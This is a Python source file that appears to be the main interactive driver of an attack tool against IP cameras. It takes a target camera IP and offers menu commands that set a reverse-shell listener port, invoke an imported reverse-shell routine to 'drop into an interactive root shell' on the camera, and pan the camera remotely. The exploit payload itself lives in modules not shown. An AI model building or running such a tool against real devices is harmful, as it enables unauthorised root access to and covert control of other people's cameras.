import os
import sys
import time
import struct
import socket
import colorama

from oprmsg import move_cam
from network import reverse_shell

camera_ip = None
target_ip = 'auto'
listen_port = 1799
target_port = None

def print_help():
    print("")
    print("[?] Available commands:")
    print("[?] help             Print this message")
    print("[?] set cam <IP>     Set the IP of the camera")
    print("[?] set self <IP>    Set the IP of the host (default: autodetect)")
    print("[?] set port <port>  Set the port used for the reverse shell (default: 1799)")
    print("[?] set tport <port> Set the webserver port on the camera (default: autodetect)")
    print("[?] shell            Drop into an interactive root shell")
    print("[?] up               Move the camera up")
    print("[?] right            Move the camera right")
    print("[?] left             Move the camera left")
    print("[?] down             Move the camera down")
    print("[?] quit             Exit the program")
    print("")

def quit():
    print("[i] Exiting... Goodbye :)")
    sys.exit(0)

def main():
    # Initialise colorama - this will make sure colours work on Windows as well
    colorama.init(autoreset=True)

    global camera_ip, target_ip, listen_port, target_port

    # Print help before requesting any input
    print_help()
    try:
        while True:
            inp = input("[>] ")
            inps = inp.split(' ')

            if inp == 'quit':
                quit()

            elif inp == 'shell':
                reverse_shell.pop_a_shell(camera_ip, listen_port, target_ip, target_port)

            elif inp in ['up', 'down', 'left', 'right']:
                move_cam.move_cam(camera_ip, inp)

            elif inp == 'help':
                print_help()
                continue

            elif inps[:2] == ['set', 'cam'] and len(inps) == 3:
                camera_ip = inps[2]
                print("[i] Set camera IP to %s" % camera_ip)

            elif inps[:2] == ['set', 'self'] and len(inps) == 3:
                target_ip = inps[2]
                print("[i] Set camera IP to %s" % camera_ip)

            elif inps[:2] == ['set', 'port'] and len(inps) == 3:
                try:
                    listen_port = int(inps[2])
                except ValueError:
                    print(colorama.Fore.RED + "[!] Invalid port '%s' supplied" % inps[2])
                else:
                    print("[i] Set shell port to %d" % listen_port)

            elif inps[:2] == ['set', 'tport'] and len(inps) == 3:
                try:
                    target_port = int(inps[2])
                except ValueError:
                    print(colorama.Fore.RED + "[!] Invalid port '%s' supplied" % inps[2])
                else:
                    print("[i] Set target port to %d" % target_port)

            else:
                print(colorama.Fore.RED + "[!] Unknown command '%s'" % inp)
                print_help()
                continue

    except (KeyboardInterrupt, EOFError):
        print("\n")
        quit()

if __name__ == '__main__':
    # Change the working directory to directory of 'main.py'.
    # Needed to run a bash script.
    os.chdir(sys.path[1])

    if len(sys.argv) < 2:
        print("[?] Please enter the ip address of the target.")
        camera_ip = input("> ")
    else:
        camera_ip = sys.argv[1]

    main()
